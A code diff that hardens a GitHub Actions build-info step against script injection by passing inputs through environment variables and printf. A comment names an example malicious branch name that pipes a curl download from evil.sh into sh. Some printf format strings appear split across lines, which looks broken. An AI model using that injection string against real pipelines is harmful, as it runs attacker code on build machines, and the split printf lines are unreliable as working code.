@@ -21,24 +21,40 @@ runs:
   steps:
     - name: Generate Build Information
       shell: bash
+      # Audit fix (script injection): ${{ }} in run: is pasted into the script BEFORE bash parses it.
+      # A branch named  x$(curl evil.sh|sh)  is a valid ref, and inputs come from callers, so both were
+      # executable. Pass values through env: and let bash expand them as DATA, always quoted.
+      env:
+        APP_NAME: ${{ inputs.application-name }}
+        APP_ENV: ${{ inputs.environment }}
       run: |
-        set -e
+        set -euo pipefail
 
         mkdir -p output
 
         BUILD_TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
 
-        cat <<EOF > output/build-info.txt
-        Application : ${{ inputs.application-name }}
-        Environment : ${{ inputs.environment }}
-        Repository  : ${{ github.repository }}
-        Branch      : ${{ github.ref_name }}
-        Commit SHA  : ${{ github.sha }}
-        Run Number  : ${{ github.run_number }}
-        Workflow    : ${{ github.workflow }}
-        Triggered By: ${{ github.actor }}
-        Build Time  : ${BUILD_TIME}
-        EOF
+        # GITHUB_* are default runner env vars; printf never interprets the values.
+        {
+          printf 'Application : %s
+' "$APP_NAME"
+          printf 'Environment : %s
+' "$APP_ENV"
+          printf 'Repository  : %s
+' "$GITHUB_REPOSITORY"
+          printf 'Branch      : %s
+' "$GITHUB_REF_NAME"
+          printf 'Commit SHA  : %s
+' "$GITHUB_SHA"
+          printf 'Run Number  : %s
+' "$GITHUB_RUN_NUMBER"
+          printf 'Workflow    : %s
+' "$GITHUB_WORKFLOW"
+          printf 'Triggered By: %s
+' "$GITHUB_ACTOR"
+          printf 'Build Time  : %s
+' "$BUILD_TIME"
+        } > output/build-info.txt
 
         echo "======================================"
         echo "Build Information"
